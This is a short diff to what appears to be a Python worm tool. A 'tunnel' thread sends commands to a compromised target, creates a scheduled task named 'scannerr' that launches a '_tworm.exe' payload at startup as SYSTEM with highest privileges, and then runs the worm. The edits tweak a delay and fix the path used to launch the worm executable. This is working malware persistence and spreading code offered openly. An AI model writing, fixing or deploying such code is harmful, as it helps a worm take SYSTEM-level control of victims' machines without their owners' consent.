@@ -205,7 +205,7 @@ class tunnel(threading.Thread):
             command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "{}/{}_tworm.exe";'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
-            time.sleep(3)
+            time.sleep(4)
             tasks_response = self.get_response(conn,1024)
             print("Target Response: {}".format(tasks_response))
             
@@ -219,7 +219,7 @@ class tunnel(threading.Thread):
                 print("Target Response: {}".format(tasks_response))
             
             #execute the worm on the target machine
-            command = "./{}_tworm.exe".format(self.lhost).encode()
+            command = "{}/{}_tworm.exe".format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
